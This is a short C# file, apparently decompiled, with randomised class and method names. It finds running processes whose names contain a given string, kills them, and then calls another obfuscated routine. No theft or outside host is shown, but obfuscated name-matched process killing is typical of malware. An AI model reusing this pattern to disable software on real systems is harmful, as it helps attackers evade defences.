using System;
using System.Diagnostics;

namespace frgoWklvEOSV;

public sealed class xctUtgFsRkGVFBEL
{
	public static bool RNfapZoVNfqwThPb(Process P_0, string P_1)
	{
		try
		{
			return P_0.ProcessName.ToLower().Contains(P_1.ToLower());
		}
		catch (InvalidOperationException)
		{
			return false;
		}
		catch (NullReferenceException)
		{
			return false;
		}
		catch
		{
			return false;
		}
	}

	public static void mwRnumQnlYxOfki(string P_0, string P_1)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			if (RNfapZoVNfqwThPb(process, P_0.ToLower()))
			{
				try
				{
					process.Kill();
					process.WaitForExit();
					PFruJiQrcriiZ.yQfvyropwD();
				}
				catch (InvalidOperationException)
				{
				}
				catch (PlatformNotSupportedException)
				{
					break;
				}
				catch
				{
				}
			}
		}
	}
}
